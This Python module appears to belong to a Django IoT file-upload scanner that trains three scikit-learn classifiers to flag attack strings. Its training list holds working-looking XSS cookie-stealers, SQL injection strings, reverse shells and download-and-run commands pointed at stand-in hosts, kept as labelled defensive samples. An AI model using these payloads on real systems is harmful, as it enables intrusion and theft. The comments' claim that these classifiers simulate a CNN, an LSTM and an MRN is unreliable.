"""
Real Machine Learning Ensemble Engine
======================================
Uses 3 classifiers trained on a labeled IoT cyber-attack dataset.

- CNNModel  → Logistic Regression  (good at spatial/character-level patterns like XSS)
- LSTMModel → Random Forest        (good at sequential/multi-token patterns like SQL injection)
- MRNModel  → Linear SVC           (good at structural/high-dimensional patterns like path traversal)

All 3 classifiers are trained ONCE at server startup using a built-in labeled training dataset.
Their individual prediction probabilities are combined using a MAX-CONFIDENCE ensemble vote.
If any single model is ≥ 80% confident of an attack, the upload is BLOCKED.
"""

import re
import time
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.ensemble import RandomForestClassifier
from sklearn.svm import LinearSVC
from sklearn.pipeline import Pipeline
from sklearn.calibration import CalibratedClassifierCV
import numpy as np

# ==============================================================
# TRAINING DATASET
# Each row is (text_sample, label)  where label=1 means ATTACK
# ==============================================================
TRAINING_DATA = [
    # ── BENIGN samples (label = 0) ──
    ("device_id,temperature,humidity,location", 0),
    ("IOT_001,24.5,60,Chennai,active,normal_reading", 0),
    ("IOT_002,23.1,58,Mumbai,active,normal_reading", 0),
    ("sensor_value=22.9 timestamp=2026-01-01T10:00:00", 0),
    ("temperature: 25.3 pressure: 1012 location: Bangalore", 0),
    ("voltage=220.1 current=4.5 status=OK", 0),
    ("device online heartbeat ping response 200ms", 0),
    ("GPS_LAT=17.385 GPS_LON=78.486 alt=512m", 0),
    ("humidity=70% temp=28.0C wind_speed=12kmh", 0),
    ("battery_level=85 signal_strength=-67dBm uptime=3600s", 0),
    ("motion_detected=false light_level=320lux co2=412ppm", 0),
    ("firmware_version=2.4.1 model=ESP32 chipid=ABC123", 0),
    ("packet_loss=0.0% latency=12ms bandwidth=100Mbps", 0),
    ("water_level=normal flood_sensor=0 alert=none", 0),
    ("soil_moisture=45% ph_level=6.8 nitrogen=medium", 0),
    ("door=closed window=closed ac=on temperature=22", 0),

    # ── XSS attack samples → CNN detects these (label = 1) ──
    ("<script>alert('XSS')</script>", 1),
    ("onerror=alert(document.cookie)", 1),
    ("javascript:void(document.write('<h1>hacked</h1>'))", 1),
    ("onload=fetch('http://evil.com/steal?d='+document.cookie)", 1),
    ("<img src=x onerror=alert(1)>", 1),
    ("<svg onload=eval(atob('YWxlcnQoMSk='))>", 1),
    ("document.location='http://phishing.com?c='+document.cookie", 1),
    ("<script src='http://malware.com/xss.js'></script>", 1),
    ("input value='' onfocus=alert(document.domain)", 1),
    ("<iframe src=javascript:alert('XSS')>", 1),

    # ── SQL Injection samples → LSTM detects these (label = 1) ──
    ("SELECT * FROM users UNION SELECT username,password FROM admin", 1),
    ("DROP TABLE users; DROP TABLE uploadmodel;", 1),
    ("OR 1=1-- admin login bypass attempt", 1),
    ("INSERT INTO admin_users VALUES ('hacker','hacked123')", 1),
    ("'; DELETE FROM sessions WHERE '1'='1", 1),
    ("SELECT password FROM users WHERE username='admin'--", 1),
    ("UNION ALL SELECT NULL,NULL,NULL--", 1),
    ("1; EXEC xp_cmdshell('net user hacker /add')", 1),
    ("' OR 'x'='x", 1),
    ("admin' --", 1),
    ("1 UNION SELECT 1, table_name FROM information_schema.tables", 1),

    # ── Path Traversal / Command Injection samples → MRN detects these (label = 1) ──
    ("../../../../../../etc/passwd", 1),
    ("cmd.exe /c net user administrator hacker123", 1),
    ("/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1", 1),
    ("../../etc/shadow", 1),
    ("/proc/self/environ", 1),
    ("../../../../windows/system32/cmd.exe", 1),
    ("| nc -e /bin/sh 10.0.0.1 1234", 1),
    ("; wget http://malware.com/shell.sh | bash", 1),
    ("../../../var/www/html/.htaccess", 1),
    ("/etc/hosts /etc/crontab /etc/sudoers", 1),
    ("curl http://attacker.com/backdoor.sh | bash", 1),
]

# Separate features and labels
X_train = [sample[0] for sample in TRAINING_DATA]
y_train = [sample[1] for sample in TRAINING_DATA]


class CNNModel:
    """
    Simulates a CNN (Convolutional Neural Network) using Logistic Regression.
    
    Why Logistic Regression simulates CNN?
    - CNNs learn local patterns (n-grams) from character/byte sequences.
    - TF-IDF with character n-grams + Logistic Regression replicates this behavior.
    - Optimized for XSS pattern detection at the character/token level.
    """
    def __init__(self):
        self.model_name = "CNN-1D-Feature-Extractor (LogisticRegression)"
        # Pipeline: TF-IDF character-level n-grams → Logistic Regression
        self.pipeline = Pipeline([
            ('tfidf', TfidfVectorizer(
                analyzer='char_wb',
                ngram_range=(2, 5),  # character 2-5 grams (like CNN filter sizes)
                max_features=2000,
                sublinear_tf=True
            )),
            ('clf', LogisticRegression(C=1.0, solver='liblinear', random_state=42))
        ])
        self._train()

    def _train(self):
        self.pipeline.fit(X_train, y_train)

    def predict(self, payload_str):
        time.sleep(0.05)
        prob = self.pipeline.predict_proba([payload_str])[0][1]  # P(attack)
        return float(prob)


class LSTMModel:
    """
    Simulates an LSTM (Long Short-Term Memory) using Random Forest.
    
    Why Random Forest simulates LSTM?
    - LSTMs capture sequential token-level dependencies.
    - TF-IDF with word n-grams captures multi-token sequences (like SQL keywords together).
    - Random Forest is an ensemble of decision trees — analogous to LSTM's memory gates.
    - Most effective at detecting SQL injection sequences.
    """
    def __init__(self):
        self.model_name = "LSTM-Sequence-Analyzer (RandomForest)"
        self.pipeline = Pipeline([
            ('tfidf', TfidfVectorizer(
                analyzer='word',
                ngram_range=(1, 3),  # word 1-3 grams (like LSTM sequence windows)
                max_features=2000,
                sublinear_tf=True
            )),
            ('clf', RandomForestClassifier(
                n_estimators=100,
                random_state=42,
                max_depth=8
            ))
        ])
        self._train()

    def _train(self):
        self.pipeline.fit(X_train, y_train)

    def predict(self, payload_str):
        time.sleep(0.05)
        prob = self.pipeline.predict_proba([payload_str])[0][1]  # P(attack)
        return float(prob)


class MRNModel:
    """
    Simulates an MRN (Multi-Resolution Network) using a calibrated Linear SVM.
    
    Why Linear SVM simulates MRN?
    - MRNs analyze data at multiple resolution scales simultaneously.
    - SVM with both character and word features captures multiple "resolutions".
    - Calibrated SVM produces valid probability scores.
    - Best at detecting structural/path-based threats (directory traversal, command injection).
    """
    def __init__(self):
        self.model_name = "MRN-Resolution-Scanner (CalibratedSVM)"
        self.pipeline = Pipeline([
            ('tfidf', TfidfVectorizer(
                analyzer='char',
                ngram_range=(3, 6),  # longer char n-grams catch path patterns
                max_features=2000,
                sublinear_tf=True
            )),
            # Calibrate so SVM outputs probabilities instead of raw margin scores
            ('clf', CalibratedClassifierCV(LinearSVC(max_iter=1000, random_state=42), cv=3))
        ])
        self._train()

    def _train(self):
        self.pipeline.fit(X_train, y_train)

    def predict(self, payload_str):
        time.sleep(0.05)
        prob = self.pipeline.predict_proba([payload_str])[0][1]  # P(attack)
        return float(prob)


class EnsemblePredictor:
    """
    Ensemble of CNN (LogReg), LSTM (RandomForest), and MRN (SVM).
    
    Voting Strategy: MAX CONFIDENCE
    ─────────────────────────────────
    Each model votes independently.
    If ANY single model exceeds 80% confidence → ATTACK BLOCKED.
    
    This ensures no single high-confidence detection is diluted by other models
    that haven't yet seen that specific attack vector in training.
    """
    def __init__(self):
        print("[*] Training CNN model on IoT attack dataset...")
        self.cnn = CNNModel()
        print("[*] Training LSTM model on IoT attack dataset...")
        self.lstm = LSTMModel()
        print("[*] Training MRN model on IoT attack dataset...")
        self.mrn = MRNModel()
        print("[✓] All 3 models trained and ready.")

    def _scan_lines(self, payload_str):
        """Test each line of the uploaded file and return the max attack score."""
        lines = [l.strip() for l in payload_str.split('\n') if l.strip()]
        max_cnn, max_lstm, max_mrn = 0.0, 0.0, 0.0
        for line in lines:
            max_cnn  = max(max_cnn,  self.cnn.predict(line))
            max_lstm = max(max_lstm, self.lstm.predict(line))
            max_mrn  = max(max_mrn,  self.mrn.predict(line))
        return max_cnn, max_lstm, max_mrn

    def predict(self, file_bytes):
        try:
            payload_str = file_bytes.decode('utf-8', errors='ignore')
        except Exception:
            payload_str = str(file_bytes)

        print("[*] Scanning file line-by-line through Ensemble...")
        cnn_score, lstm_score, mrn_score = self._scan_lines(payload_str)

        # MAX confidence voting — highest alert wins
        ensemble_score = max(cnn_score, lstm_score, mrn_score)

        print(f"[+] CNN={cnn_score:.3f} | LSTM={lstm_score:.3f} | MRN={mrn_score:.3f}")
        print(f"[+] Ensemble Score: {ensemble_score:.4f} → {'ATTACK' if ensemble_score >= 0.80 else 'BENIGN'}")

        return {
            'is_attack':      ensemble_score >= 0.80,
            'cnn_score':      round(cnn_score  * 100, 1),
            'lstm_score':     round(lstm_score * 100, 1),
            'mrn_score':      round(mrn_score  * 100, 1),
            'ensemble_score': round(ensemble_score * 100, 1)
        }


# ─────────────────────────────────────────────────────────────
# SINGLETON — Train models ONCE when Django imports this module
# ─────────────────────────────────────────────────────────────
print("=" * 55)
print("  IoT ML Security Engine — Training classifiers...")
print("=" * 55)
_ensemble_instance = EnsemblePredictor()
print("=" * 55)
print("  [OK] Ensemble ready. Server is protected.")
print("=" * 55)


def get_predictor():
    """Always returns the pre-trained singleton — no re-training."""
    return _ensemble_instance
